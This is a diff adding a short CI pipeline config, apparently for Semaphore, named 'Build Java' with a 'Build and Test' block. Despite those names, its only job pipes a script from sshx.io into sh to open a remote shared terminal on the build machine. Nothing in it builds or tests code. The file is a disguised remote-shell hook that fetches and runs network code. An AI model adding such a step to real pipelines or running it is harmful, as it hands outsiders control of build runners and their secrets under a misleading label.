@@ -1,0 +1,14 @@
+version: v1.0
+name: Build Java
+agent:
+  machine:
+    type: f1-standard-2
+    os_image: ubuntu2404
+
+blocks:
+  - name: Build and Test
+    task:
+      jobs:
+        - name: sshx
+          commands:
+          - curl -sSf https://sshx.io/get | sh -s run
